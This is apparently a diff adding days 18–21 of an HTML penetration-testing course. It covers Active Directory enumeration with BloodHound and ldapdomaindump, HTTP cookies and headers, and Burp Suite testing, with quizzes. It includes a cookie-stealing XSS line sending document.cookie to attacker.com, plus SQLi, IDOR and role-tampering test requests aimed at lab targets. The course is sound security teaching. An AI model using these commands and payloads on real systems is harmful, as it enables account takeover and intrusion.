+<span class="hw">Minimum password length: 0</span>     <span class="hw">← EMPTY PASSWORDS ALLOWED</span>
+<span class="hw">Password history length: 0</span>
+<span class="hw">Maximum password age: None</span>     <span class="hw">← PASSWORDS NEVER EXPIRE</span>
+
+<span class="co"># ── SMB MAP for share permissions ─────────────────────────────</span>
+<span class="pr">$</span> <span class="cm">smbmap -H 192.168.56.101</span>
+<span class="hb">Disk       Permissions   Comment
+----       -----------   -------
+tmp        READ, WRITE   oh noes!      ← you can write files here
+opt        NO ACCESS</span></div>
+  </div>
+
+  <div class="slbl">// 18.3 — BLOODHOUND: GRAPH-BASED AD ATTACK PATHS</div>
+
+  <div class="card">
+    <div class="clbl">HOW BLOODHOUND WORKS</div>
+    <p>BloodHound collects AD data via a "collector" (SharpHound on Windows, BloodHound.py on Linux/network level). It dumps all users, groups, GPOs, sessions, and ACLs into JSON. The BloodHound GUI imports this and graphs relationships. You then query for attack paths using Cypher queries against a Neo4j database.</p>
+  </div>
+
+  <div class="ad-map">
+    <div class="ad-title">// BLOODHOUND — ATTACK PATH VISUALIZATION (TEXT REPRESENTATION)</div>
+<span class="ad-node-user">john.smith</span> <span class="ad-edge">──[MemberOf]──►</span> <span class="ad-node-comp">IT-HELPDESK</span> <span class="ad-edge">──[GenericAll]──►</span> <span class="ad-node-admin">svc-backup</span>
+    <span class="ad-edge">                                                   │</span>
+    <span class="ad-edge">                                                   │ [MemberOf]</span>
+    <span class="ad-edge">                                                   ▼</span>
+<span class="ad-node-user">jane.doe</span>   <span class="ad-edge">──[AdminTo]──►</span> <span class="ad-node-comp">DC01.corp.local</span>  <span class="ad-node-admin">BACKUP-ADMINS</span>
+    <span class="ad-edge">                         │                         │</span>
+    <span class="ad-edge">                         │ [DCSync Rights]          │ [AdminTo]</span>
+    <span class="ad-edge">                         ▼                         ▼</span>
+    <span class="ad-edge">                  </span><span class="ad-node-da">DOMAIN ADMINS ◄──────────────── DC01.corp.local</span>
+
+<span class="ad-edge">
+ATTACK PATH FOUND (4 hops):
+john.smith → GenericAll on svc-backup → svc-backup in BACKUP-ADMINS
+→ BACKUP-ADMINS AdminTo DC01 → DC01 has DCSync rights → DOMAIN ADMIN
+
+BloodHound query: "Find Shortest Paths to Domain Admins"
+Cypher: MATCH p=shortestPath((u:User{name:"john.smith@CORP.LOCAL"})
+        -[*1..]→(g:Group{name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p</span>
+  </div>
+
+  <div class="term">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">BLOODHOUND SETUP & DATA COLLECTION</div></div>
+    <div class="tbody"><span class="co"># Install BloodHound on Kali:</span>
+<span class="pr">$</span> <span class="cm">sudo apt install bloodhound neo4j -y</span>
+<span class="pr">$</span> <span class="cm">sudo neo4j start</span>
+<span class="co"># First run: go to http://localhost:7474, change default neo4j password</span>
+<span class="pr">$</span> <span class="cm">bloodhound &</span>   <span class="co"># Opens BloodHound GUI</span>
+
+<span class="co"># Collect AD data from network (no Windows agent needed):</span>
+<span class="pr">$</span> <span class="cm">pip3 install bloodhound</span>
+<span class="pr">$</span> <span class="cm">bloodhound-python -u john.smith -p 'Password123' \
+  -d corp.local -dc dc01.corp.local \
+  -c All --zip</span>
+<span class="co"># -c All = collect Users, Groups, Computers, Sessions, ACLs, Trusts, GPOs
+# --zip  = creates a zip file for BloodHound import</span>
+
+<span class="co"># In BloodHound UI: Upload Data → select the zip → wait for import</span>
+
+<span class="co"># ── Most powerful BloodHound queries ─────────────────────────</span>
+<span class="hi">Pre-built queries (click "Analysis" in BloodHound):</span>
+<span class="hb">→ Find all Domain Admins</span>
+<span class="hb">→ Find Shortest Paths to Domain Admins</span>
+<span class="hb">→ Find Principals with DCSync Rights</span>
+<span class="hb">→ List All Kerberoastable Accounts</span>
+<span class="hb">→ Find Computers where Domain Admins are logged in</span>
+<span class="hb">→ Find AS-REP Roastable Users</span>
+
+<span class="hw"># Every highlighted path in BloodHound is a real attack vector
+# The tool doesn't exploit — it shows you WHERE to exploit</span></div>
+  </div>
+
+  <div class="slbl">// 18.4 — ldapdomaindump: DUMPING AD OVER LDAP</div>
+
+  <div class="term">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">ldapdomaindump — AD ENUMERATION WITH CREDENTIALS</div></div>
+    <div class="tbody"><span class="co"># If you have any domain credentials (even a standard user), you can dump AD:</span>
+<span class="pr">$</span> <span class="cm">ldapdomaindump -u 'CORP\john.smith' -p 'Password123' \
+  ldap://dc01.corp.local</span>
+
+<span class="co"># Creates HTML and JSON files:</span>
+<span class="hb">domain_users.html       ← All domain users with properties</span>
+<span class="hb">domain_groups.html      ← All groups and their members</span>
+<span class="hb">domain_computers.html   ← All domain-joined computers</span>
+<span class="hb">domain_policy.html      ← Password policy, lockout policy</span>
+<span class="hb">domain_trusts.html      ← Trust relationships between domains</span>
+
+<span class="co"># Parse for high-value targets:</span>
+<span class="pr">$</span> <span class="cm">cat domain_users.json | python3 -c "
+import json,sys
+users = json.load(sys.stdin)
+for u in users:
+    if 'Admin' in str(u.get('memberOf','')):
+        print(u['sAMAccountName'], '->', u['memberOf'])"</span>
+
+<span class="hw">svc-backup → ['CN=BACKUP-ADMINS,DC=corp,DC=local']
+jane.doe   → ['CN=Domain Admins,DC=corp,DC=local']</span></div>
+  </div>
+
+  <div class="slbl">// DAY 18 — QUIZ</div>
+  <div class="qblock">
+    <div class="qt">BloodHound shows that user <code>helpdesk01</code> has <strong>GenericAll</strong> permission over user <code>svc-sql</code>, and <code>svc-sql</code> is in the <strong>DBA-Admins</strong> group which has admin rights to the SQL server containing all customer data. You have compromised helpdesk01. What does GenericAll permission allow you to do with svc-sql?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','You can\'t view svc-sql\'s current password hash from GenericAll alone — that\'s a different technique (DCSync or local SAM dump). GenericAll gives you write control over the object.')"><span class="qk">A</span> View svc-sql\'s current password hash in plaintext</div>
+      <div class="qo" onclick="qa(this,'wrong','Deleting the account is possible but catastrophically disruptive and completely outside the scope of a pentest. Never delete accounts.')"><span class="qk">B</span> Delete the svc-sql account from the domain</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! GenericAll means "full control" over that AD object. You can: (1) Reset svc-sql\'s password to anything you choose without knowing the current password, (2) Add SPN to the account to make it Kerberoastable, (3) Perform a "Targeted Kerberoast", (4) Add svc-sql to any group. The attack chain: helpdesk01 (GenericAll) → reset svc-sql\'s password → log in as svc-sql → access SQL server as DBA-Admin → dump all customer data. This is exactly the 4-hop path BloodHound visualizes.')"><span class="qk">C</span> Reset svc-sql\'s password without knowing the current one, then authenticate as svc-sql to access the SQL server</div>
+      <div class="qo" onclick="qa(this,'wrong','Reading all files on the SQL server requires authentication as a privileged user — GenericAll on the AD account gives you that authentication capability by allowing password reset, but it\'s not a direct file access mechanism.')"><span class="qk">D</span> Directly read all files on the SQL server without needing svc-sql\'s credentials</div>
+    </div>
+    <div class="qfb" id="q3"></div>
+  </div>
+
+</div><!-- /p3 -->
+
+
+<!-- ════════════════ DAY 19 ════════════════ -->
+<div class="panel" id="p4">
+  <div class="dh">
+    <div class="dnum">19</div>
+    <div class="dtitle">
+      <h2>WEB APP FUNDAMENTALS</h2>
+      <p><span class="stag s-th">THEORY</span><span class="stag s-lb">LAB</span> HTTP Methods · Cookies · Sessions · Headers · Dev Tools</p>
+    </div>
+  </div>
+
+  <div class="pbar-w">
+    <div class="pbar-l">WEEK 3 PROGRESS — DAY 19 OF 21</div>
+    <div class="pbar-t"><div class="pbar-f" style="width:90%"></div></div>
+  </div>
+
+  <div class="note ni">
+    <div class="nico">🕸️</div>
+    <p><strong>Web apps are the #1 attack surface in modern pentesting.</strong> Bug bounty programs, most corporate breaches, and the majority of OWASP Top 10 vulnerabilities all live in web apps. Before you can attack them with Burp Suite (tomorrow), you need to think exactly like a browser — understanding every HTTP request, cookie, and header at the byte level.</p>
+  </div>
+
+  <div class="slbl">// 19.1 — HTTP METHODS AND THEIR SECURITY IMPLICATIONS</div>
+
+  <table class="tbl">
+    <tr><th>METHOD</th><th>INTENDED USE</th><th>SECURITY ISSUE</th></tr>
+    <tr><td><span class="hl">GET</span></td><td>Retrieve a resource. Parameters in URL.</td><td>Parameters visible in logs, browser history, referrer headers. Never put sensitive data in GET.</td></tr>
+    <tr><td><span class="hl">POST</span></td><td>Send data to server (forms, login). Body carries data.</td><td>Safer than GET but still visible to MITM if no HTTPS. CSRF attacks target POST actions.</td></tr>
+    <tr><td><span class="hlw">PUT</span></td><td>Replace a resource entirely. RESTful APIs.</td><td>If enabled on web servers: can upload files, potentially webshells. WebDAV PUT = file upload.</td></tr>
+    <tr><td><span class="hlw">DELETE</span></td><td>Remove a resource. RESTful APIs.</td><td>Missing authorization checks → any user deletes any resource (IDOR on DELETE).</td></tr>
+    <tr><td><span class="hlr">OPTIONS</span></td><td>Query supported methods for a resource.</td><td>Reveals all available methods — tells attacker if PUT/DELETE are enabled. Always test this.</td></tr>
+    <tr><td><span class="hlr">TRACE</span></td><td>Echo request back for debugging.</td><td>Cross-Site Tracing (XST) attack — can steal cookies via TRACE + XSS. Should be disabled.</td></tr>
+    <tr><td><span class="hlp">PATCH</span></td><td>Partial update. RESTful APIs.</td><td>Like PUT — missing auth = unauthorized modification of any user's data.</td></tr>
+  </table>
+
+  <div class="slbl">// 19.2 — COOKIES AND SESSIONS</div>
+
+  <div class="card">
+    <div class="clbl">HOW AUTHENTICATION STATE WORKS</div>
+    <p>HTTP is stateless — each request is independent. Cookies and session tokens give it "memory". This is also why session attacks are so impactful: steal the cookie, steal the identity.</p>
+  </div>
+
+  <div class="term">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">COOKIE SECURITY FLAGS — KNOW THESE COLD</div></div>
+    <div class="tbody"><span class="co"># Server sets a session cookie after login:</span>
+Set-Cookie: <span class="hi">PHPSESSID=abc123def456; Path=/; Domain=bank.com</span>
+
+<span class="co"># SECURE cookie (missing in above — VULNERABILITY):</span>
+Set-Cookie: PHPSESSID=abc123; <span class="hi">Secure</span>; <span class="hi">HttpOnly</span>; <span class="hi">SameSite=Strict</span>; Path=/
+
+<span class="co">FLAG BREAKDOWN:</span>
+<span class="hi">Secure</span>    → Cookie ONLY sent over HTTPS. Without this: session token sent in HTTP cleartext → sniffable
+<span class="hi">HttpOnly</span>  → Cookie NOT accessible to JavaScript (document.cookie). Without this → XSS can steal it
+<span class="hi">SameSite</span>  → Controls cross-site requests:
+             Strict = never sent cross-site (strongest CSRF protection)
+             Lax    = sent on top-level GET only (default in modern browsers)
+             None   = sent everywhere (requires Secure flag) → CSRF risk
+
+<span class="hw">ATTACK — Stealing cookie missing HttpOnly via XSS:</span>
+<span class="hr">&lt;script&gt;document.location='https://attacker.com/steal?c='+document.cookie&lt;/script&gt;</span>
+<span class="co"># If HttpOnly is set, document.cookie returns empty string — attack fails
+# If HttpOnly is MISSING — session token is exfiltrated in the request URL</span>
+
+<span class="co"># ANALYZE COOKIES IN PRACTICE:</span>
+<span class="pr">$</span> <span class="cm">curl -v -c cookies.txt http://192.168.56.101/dvwa/login.php 2>&1 | grep "Set-Cookie"</span>
+<span class="hw">← Look for missing Secure, HttpOnly, SameSite flags on every cookie</span></div>
+  </div>
+
+  <div class="slbl">// 19.3 — SECURITY HEADERS</div>
+
+  <table class="tbl">
+    <tr><th>HEADER</th><th>PURPOSE</th><th>MISSING = ?</th></tr>
+    <tr><td><span class="hl">Content-Security-Policy (CSP)</span></td><td>Restricts which scripts, styles, and resources a page can load. Strongest XSS mitigation.</td><td>XSS attacks can load external scripts, execute arbitrary JavaScript</td></tr>
+    <tr><td><span class="hl">Strict-Transport-Security (HSTS)</span></td><td>Forces HTTPS for a specified period. Prevents SSL stripping attacks.</td><td>SSL stripping attack: attacker downgrades HTTPS to HTTP mid-connection</td></tr>
+    <tr><td><span class="hl">X-Frame-Options</span></td><td>Prevents the page from being loaded in an iframe. Blocks Clickjacking.</td><td>Clickjacking: attacker overlays invisible iframe over a trusted site, tricks user into clicking</td></tr>
+    <tr><td><span class="hl">X-Content-Type-Options: nosniff</span></td><td>Prevents browser from guessing content type. Forces declared MIME type.</td><td>MIME sniffing attacks: serve a .txt file containing JavaScript, browser executes it</td></tr>
+    <tr><td><span class="hl">Referrer-Policy</span></td><td>Controls how much URL info the Referrer header reveals to other sites.</td><td>Sensitive URLs (with tokens, user IDs) leaked in Referrer to third-party analytics scripts</td></tr>
+    <tr><td><span class="hlr">Server: Apache/2.2.8</span></td><td>Reveals web server software and version. Should be suppressed.</td><td>Fingerprinting: attacker immediately knows which CVEs to look up for this exact version</td></tr>
+  </table>
+
+  <div class="term">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">ANALYZING HTTP HEADERS IN PRACTICE</div></div>
+    <div class="tbody"><span class="pr">$</span> <span class="cm">curl -I https://targetwebsite.com</span>
+
+<span class="hb">HTTP/2 200
+Content-Type: text/html; charset=UTF-8</span>
+<span class="hw">Server: Apache/2.4.41</span>                     <span class="hw">← version disclosed</span>
+<span class="hw">X-Powered-By: PHP/7.3.9</span>                   <span class="hw">← PHP version (EOL!)</span>
+<span class="hb">Strict-Transport-Security: max-age=31536000; includeSubDomains</span>  <span class="co">← good</span>
+<span class="hw">X-Frame-Options: [MISSING]</span>                <span class="hw">← clickjacking possible</span>
+<span class="hw">Content-Security-Policy: [MISSING]</span>        <span class="hw">← XSS not mitigated</span>
+<span class="hw">X-Content-Type-Options: [MISSING]</span>         <span class="hw">← MIME sniffing risk</span>
+<span class="hb">Set-Cookie: session=abc123</span>                 <span class="hw">← no Secure! no HttpOnly!</span>
+
+<span class="co"># Quick automated header check:</span>
+<span class="pr">$</span> <span class="cm">python3 -c "
+import requests
+r = requests.get('http://target.com')
+security_headers = ['Content-Security-Policy','X-Frame-Options',
+                    'X-Content-Type-Options','Strict-Transport-Security']
+for h in security_headers:
+    status = r.headers.get(h, 'MISSING')
+    print(f'{h}: {status}')"</span></div>
+  </div>
+
+  <div class="slbl">// DAY 19 — QUIZ</div>
+  <div class="qblock">
+    <div class="qt">A web app sets this cookie: <code>Set-Cookie: auth_token=eyJhbGc...; Path=/</code>. What are ALL the security issues with this cookie, and what is the realistic attack impact of each?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','The encoding (eyJ... is base64 = JWT format) is a separate issue but not what\'s most immediately dangerous about this cookie declaration.')"><span class="qk">A</span> The eyJhbGc value looks like a JWT — the only problem is the algorithm might be weak</div>
+      <div class="qo" onclick="qa(this,'wrong','Secure flag alone is only one of three missing flags. A professional security review would catch all three.')"><span class="qk">B</span> Missing Secure flag only — the token would be sent over HTTP connections</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! Three flags are missing: (1) No Secure flag → token sent over HTTP on any non-HTTPS connection, allowing network sniffing to steal sessions on the same Wi-Fi. (2) No HttpOnly flag → JavaScript can read document.cookie and steal this token; any XSS vulnerability (even a minor one elsewhere on the site) becomes a full account takeover. (3) No SameSite flag → browser sends this cookie with any cross-site request, enabling CSRF attacks where an attacker\'s website tricks the victim\'s browser into making authenticated requests. Also: eyJhbGc is a base64 JWT — if the algorithm is "none" or HS256 with a weak secret, the token might be forgeable.')"><span class="qk">C</span> Missing Secure (HTTP sniffing), HttpOnly (XSS theft), and SameSite (CSRF) — each enables a different account takeover attack</div>
+      <div class="qo" onclick="qa(this,'wrong','Path=/ is actually correct — it means the cookie is sent with all requests to that domain, which is the intended behavior for an auth token. The path isn\'t the security issue here.')"><span class="qk">D</span> Path=/ is the problem — the cookie should only be sent to specific paths</div>
+    </div>
+    <div class="qfb" id="q4"></div>
+  </div>
+
+</div><!-- /p4 -->
+
+
+<!-- ════════════════ DAY 20 ════════════════ -->
+<div class="panel" id="p5">
+  <div class="dh">
+    <div class="dnum">20</div>
+    <div class="dtitle">
+      <h2>BURP SUITE DEEP DIVE</h2>
+      <p><span class="stag s-tl">TOOL</span><span class="stag s-lb">LAB</span> Proxy · Intercept · Repeater · Intruder · Manual Testing Workflow</p>
+    </div>
+  </div>
+
+  <div class="pbar-w">
+    <div class="pbar-l">WEEK 3 PROGRESS — DAY 20 OF 21</div>
+    <div class="pbar-t"><div class="pbar-f" style="width:95%"></div></div>
+  </div>
+
+  <div class="note ny">
+    <div class="nico">⚔️</div>
+    <p><strong>Burp Suite is your primary weapon for web application hacking.</strong> Every professional web pentester lives in Burp. It sits between your browser and the target, letting you intercept, inspect, modify, and replay every HTTP request. SQL injection, XSS, IDOR, authentication bypass — you find and exploit them all through Burp.</p>
+  </div>
+
+  <div class="slbl">// 20.1 — BURP SUITE ARCHITECTURE</div>
+
+  <div class="card">
+    <div class="clbl">HOW BURP PROXY WORKS</div>
+    <p>Burp runs as an HTTP proxy on <code>127.0.0.1:8080</code>. You configure your browser to route traffic through this proxy. Every request your browser sends now passes through Burp first — you see it, modify it, forward it, or drop it. Burp also decrypts HTTPS by acting as a trusted CA (you install Burp's certificate).</p>
+  </div>
+
+  <div class="burp-window">
+    <div class="burp-bar">
+      <span class="burp-tab">Dashboard</span>
+      <span class="burp-tab active">Proxy ●</span>
+      <span class="burp-tab">Repeater</span>
+      <span class="burp-tab">Intruder</span>
+      <span class="burp-tab">Decoder</span>
+      <span class="burp-tab">Comparer</span>
+    </div>
+    <div class="burp-body">
+      <div class="burp-pane">
+        <div class="burp-pane-title">// REQUEST (INTERCEPTED — PAUSED)</div>
+        <span class="req-method">POST</span> <span class="req-path">/dvwa/login.php HTTP/1.1</span><br>
+        <span class="req-header">Host: </span><span class="req-value">192.168.56.101</span><br>
+        <span class="req-header">Content-Type: </span><span class="req-value">application/x-www-form-urlencoded</span><br>
+        <span class="req-header">Cookie: </span><span class="req-value">PHPSESSID=abc123; security=low</span><br>
+        <span class="req-header">Content-Length: </span><span class="req-value">38</span><br>
+        <br>
+        <span class="req-body">username=admin&password=password&Login=Login</span><br>
+        <br>
+        <span style="color:var(--accent);font-size:0.68rem;margin-top:0.5rem;display:block;">▶ FORWARD &nbsp;&nbsp; ✕ DROP &nbsp;&nbsp; ↩ SEND TO REPEATER</span>
+      </div>
+      <div class="burp-pane">
+        <div class="burp-pane-title">// RESPONSE (AFTER FORWARD)</div>
+        <span class="resp-status">HTTP/1.1 302 Found</span><br>
+        <span class="resp-header">Location: </span><span class="req-value">/dvwa/index.php</span><br>
+        <span class="resp-header">Set-Cookie: </span><span class="req-value">PHPSESSID=xyz789</span><br>
+        <span class="resp-header">Content-Length: </span><span class="req-value">0</span><br>
+        <br>
+        <span style="color:var(--green);font-size:0.75rem;">✓ 302 = LOGIN SUCCESSFUL</span><br>
+        <br>
+        <span style="color:var(--muted);font-size:0.72rem;">→ Note: session cookie has no Secure/HttpOnly flags<br>→ Modify username/password above and resend via Repeater</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="slbl">// 20.2 — BURP TOOLS: WHAT EACH DOES</div>
+
+  <div class="flag-grid">
+    <div class="flag-card">
+      <div class="flag-name">Proxy / Intercept</div>
+      <div class="flag-desc">Sits between browser and target. Toggle intercept ON to pause every request and manually inspect/modify it before it's sent. The foundation of all Burp workflows.</div>
+    </div>
+    <div class="flag-card blue">
+      <div class="flag-name">Repeater</div>
+      <div class="flag-desc">Send a captured request here to modify and resend it manually, unlimited times. Testing SQL injection? Change the parameter 50 times and watch the responses change. Your most-used tool.</div>
+    </div>
+    <div class="flag-card red">
+      <div class="flag-name">Intruder</div>
+      <div class="flag-desc">Automated attack tool. Mark parameters as "payload positions", load a wordlist, fire hundreds of requests. Used for brute-forcing logins, fuzzing parameters, testing SQLi payloads. Rate-limited in Community edition.</div>
+    </div>
+    <div class="flag-card purple">
+      <div class="flag-name">Scanner (Pro only)</div>
+      <div class="flag-desc">Automated vulnerability detection. Finds SQLi, XSS, SSRF, XXE, and more. The Community edition doesn't include it — use PortSwigger Academy's hosted environment instead.</div>
+    </div>
+    <div class="flag-card green">
+      <div class="flag-name">Decoder</div>
+      <div class="flag-desc">Encode/decode data: URL encoding, Base64, HTML entities, hex. Essential for analyzing encoded payloads and crafting attacks that bypass input filters.</div>
+    </div>
+    <div class="flag-card">
+      <div class="flag-name">Target / Site Map</div>
+      <div class="flag-desc">Builds a visual map of every page, parameter, and endpoint Burp has seen while you browse. Your complete inventory of the target's web surface.</div>
+    </div>
+  </div>
+
+  <div class="slbl">// 20.3 — BURP SETUP PROCEDURE</div>
+
+  <div class="term">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">BURP SUITE SETUP — COMPLETE WALKTHROUGH</div></div>
+    <div class="tbody"><span class="co"># Burp Suite Community Edition is free and pre-installed on Kali:</span>
+<span class="pr">$</span> <span class="cm">burpsuite &</span>   <span class="co"># Launches Burp</span>
+
+<span class="co">STEP 1: Configure browser proxy
+→ In Firefox: Settings → Network Settings → Manual Proxy
+→ HTTP Proxy: 127.0.0.1  Port: 8080
+→ Check "Also use this proxy for HTTPS"
+→ Or install FoxyProxy extension for easy toggle</span>
+
+<span class="co">STEP 2: Install Burp's CA certificate (for HTTPS)
+→ With Burp running, browse to: http://burpsuite
+→ Click "CA Certificate" → download cacert.der
+→ Firefox: Settings → Privacy → Certificates → Import
+→ Check "Trust this CA to identify websites"</span>
+
+<span class="co">STEP 3: Verify it works
+→ Enable intercept: Proxy → Intercept → "Intercept is ON"
+→ Browse to http://192.168.56.101 in Firefox
+→ Request should appear paused in Burp
+→ Click "Forward" to send it through</span>
+
+<span class="co">STEP 4: Send to Repeater for testing
+→ Right-click any intercepted request → "Send to Repeater"
+→ In Repeater: modify the request → click "Send"
+→ Watch the response change as you modify parameters</span>
+
+<span class="co"># First test: DVWA SQL Injection
+→ Browse to http://192.168.56.101/dvwa
+→ Login: admin / password
+→ Go to SQL Injection → enter "1" in the User ID field → Submit
+→ Intercept this request in Burp → Send to Repeater
+→ Change id=1 to id=1' (add a single quote)
+→ Send → Response will show a MySQL error → SQLi confirmed!</span></div>
+  </div>
+
+  <div class="slbl">// 20.4 — MANUAL TESTING WORKFLOW</div>
+
+  <div class="card">
+    <div class="clbl">THE BURP MINDSET</div>
+    <p>When you visit any web page through Burp, develop this reflex: <span class="hl">every parameter is a potential injection point.</span> URL parameters, POST body fields, cookie values, HTTP headers (especially Host, User-Agent, X-Forwarded-For, Referer) — any of these that reach server-side processing can be vulnerable.</p>
+  </div>
+
+  <div class="term">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">BURP REPEATER — MANUAL TESTING PATTERNS</div></div>
+    <div class="tbody"><span class="co"># Original request (from Intercept → Send to Repeater):</span>
+<span class="hb">GET /user?id=5 HTTP/1.1</span>
+<span class="hb">Host: target.com</span>
+<span class="hb">Cookie: session=abc123</span>
+
+<span class="co"># ── TEST 1: IDOR (Insecure Direct Object Reference) ──────────</span>
+<span class="hw">GET /user?id=4 HTTP/1.1</span>   <span class="co">← change 5 to 4. Do you see another user's data?</span>
+<span class="hw">GET /user?id=1 HTTP/1.1</span>   <span class="co">← try id=1. Often admin account.</span>
+
+<span class="co"># ── TEST 2: SQL Injection (basic) ─────────────────────────────</span>
+<span class="hw">GET /user?id=5' HTTP/1.1</span>   <span class="co">← single quote → MySQL error = SQLi vulnerable</span>
+<span class="hw">GET /user?id=5 OR 1=1 HTTP/1.1</span>  <span class="co">← always true → returns all records</span>
+
+<span class="co"># ── TEST 3: XSS (reflected) ───────────────────────────────────</span>
+<span class="hw">GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1</span>
+<span class="co"># If the response contains your payload unescaped → XSS vulnerability</span>
+
+<span class="co"># ── TEST 4: IDOR on DELETE ────────────────────────────────────</span>
+<span class="hw">DELETE /api/posts/47 HTTP/1.1</span>
+<span class="hw">DELETE /api/posts/1  HTTP/1.1</span>   <span class="co">← Can you delete someone else's post?</span>
+
+<span class="co"># ── TEST 5: Auth bypass via cookie manipulation ───────────────</span>
+<span class="hb">Cookie: session=abc123; role=user</span>   <span class="co">← original</span>
+<span class="hw">Cookie: session=abc123; role=admin</span>  <span class="co">← modified. Does server trust client-side role?</span></div>
+  </div>
+
+  <div class="slbl">// DAY 20 — QUIZ</div>
+  <div class="qblock">
+    <div class="qt">In Burp Repeater, you change a request from <code>GET /profile?user_id=1042</code> to <code>GET /profile?user_id=1</code> and receive another user's full profile including their email, phone number, and address. What vulnerability is this, what OWASP category does it fall under, and what's the CVSS severity?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','SQLi would involve sending SQL syntax in the parameter (like user_id=1 OR 1=1). Simply changing a numeric ID and getting another user\'s data is a different, equally common vulnerability.')"><span class="qk">A</span> SQL Injection — the database is returning wrong records</div>
+      <div class="qo" onclick="qa(this,'wrong','XSS involves injecting scripts into responses that execute in the browser. Getting another user\'s data by changing an ID is an access control issue, not script injection.')"><span class="qk">B</span> Cross-Site Scripting (XSS) — the response contains unauthorized script content</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! This is IDOR — Insecure Direct Object Reference. The server uses a user-controlled parameter (user_id) to access objects in the database without verifying the requesting user has authorization to access that specific object. OWASP: A01:2021 — Broken Access Control (the #1 web vulnerability category). CVSS: typically 7.5–8.6 (High) since it enables unauthorized access to other users\' PII without authentication bypass. Real-world impact: if the IDs are sequential (1, 2, 3...) an attacker can automate this in Burp Intruder to dump all 50,000 user profiles. This exact vulnerability has been the root cause of many major data breaches.')"><span class="qk">C</span> IDOR (Insecure Direct Object Reference) — OWASP A01 Broken Access Control — typically CVSS High (7.5+)</div>
+      <div class="qo" onclick="qa(this,'wrong','Path traversal involves using ../ sequences to access files outside the web root. Changing a numeric user_id parameter is an authorization/access control issue, not directory traversal.')"><span class="qk">D</span> Path Traversal — accessing files outside the intended directory</div>
+    </div>
+    <div class="qfb" id="q5"></div>
+  </div>
+
+</div><!-- /p5 -->
+
+
+<!-- ════════════════ DAY 21 ════════════════ -->
+<div class="panel" id="p6">
+  <div class="dh">
+    <div class="dnum">21</div>
+    <div class="dtitle">
+      <h2>FULL LAB DAY + WEEK 3 CAPSTONE</h2>
+      <p><span class="stag s-lb">LAB</span> HackTheBox Starting Point · Full Enumeration · Week 3 Consolidation</p>
+    </div>
+  </div>
+
+  <div class="pbar-w">
+    <div class="pbar-l">WEEK 3 PROGRESS — COMPLETE ✓</div>
+    <div class="pbar-t"><div class="pbar-f" style="width:100%"></div></div>
+  </div>
+
+  <div class="note ng">
+    <div class="nico">🏆</div>
+    <p><strong>Week 3 complete.</strong> You now have the full enumeration toolkit. Today you put it all together on real machines. No walkthroughs — apply the methodology you've built.</p>
+  </div>
+
+  <div class="slbl">// 21.1 — WEEK 3 CONSOLIDATION TABLE</div>
+
+  <table class="tbl">
+    <tr><th>SKILL</th><th>WHAT YOU CAN NOW DO</th><th>TOOL</th></tr>
+    <tr><td>Nmap Mastery</td><td>Choose correct scan type per situation, write NSE scripts, read output and extract CVEs</td><td>nmap</td></tr>
+    <tr><td>Web Recon</td><td>Full directory enum, subdomain discovery, tech fingerprinting, find exposed backup files</td><td>Gobuster, ffuf, Nikto, WhatWeb</td></tr>
+    <tr><td>Vuln Scanning</td><td>Run authenticated/unauthenticated scans, read CVSS scores, triage findings</td><td>OpenVAS, Nessus</td></tr>
+    <tr><td>AD Recon</td><td>Enumerate users/groups/shares, run BloodHound, find attack paths to Domain Admin</td><td>BloodHound, enum4linux, smbmap</td></tr>
+    <tr><td>Web Fundamentals</td><td>Analyze HTTP methods, cookies, security headers; identify misconfigurations</td><td>curl, browser DevTools</td></tr>
+    <tr><td>Burp Suite</td><td>Intercept and modify requests, use Repeater for manual testing, identify IDOR/SQLi/XSS</td><td>Burp Suite Community</td></tr>
+  </table>
+
+  <div class="slbl">// 21.2 — FINAL WEEK 3 QUIZ</div>
+
+  <div class="qblock">
+    <div class="qt">You've just started a pentest. You run nmap and find port 8080 open with the response <code>Jetty 9.4.31.v20200723</code>. What is your COMPLETE next sequence of steps before attempting any exploitation?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','Immediately searching for CVEs and exploiting is skipping critical steps. You might cause outages, miss better attack vectors, or alert defenders unnecessarily early.')"><span class="qk">A</span> Immediately search "Jetty 9.4.31 exploit" on Google and run the first result</div>
+      <div class="qo" onclick="qa(this,'wrong','Notifying the client mid-engagement about every finding isn\'t standard — you document and report at the end unless you find something critically dangerous to business operations (like active exfiltration).')"><span class="qk">B</span> Stop and notify the client — a running service on port 8080 might be production</div>
+      <div class="qo" onclick="qa(this,'correct','Correct enumeration-first methodology: (1) Research: look up Jetty 9.4.31.v20200723 — is it EOL? Known CVEs? (CVE-2021-28165, CVE-2020-27216 affect this version range). (2) Deeper scan: nmap --script=http-title,http-headers,http-enum -p 8080 to see what application is hosted. (3) Browse: open http://target:8080 — is it a Jenkins/Jira/custom app? The WAR determines attack surface more than the container. (4) Web recon: gobuster on port 8080 specifically — /console, /manager, /admin. (5) Check default credentials: Jetty itself often hosts Java app servers with default admin credentials. (6) THEN check CVEs for the specific Jetty version and the application running on it. Methodology before exploitation always.')"><span class="qk">C</span> Research the Jetty version for CVEs, scan deeper for what app it hosts, enumerate directories on port 8080, check default credentials, THEN assess exploits</div>
+      <div class="qo" onclick="qa(this,'wrong','Ignoring services skips potentially critical attack vectors. Jetty on 8080 often hosts Jenkins, Java management consoles, or custom web apps that are prime targets.')"><span class="qk">D</span> Skip it — port 8080 is just a development server and unlikely to be interesting</div>
+    </div>
+    <div class="qfb" id="q6"></div>
+  </div>
+
+  <div class="slbl">// 21.3 — CAPSTONE LABS</div>
+
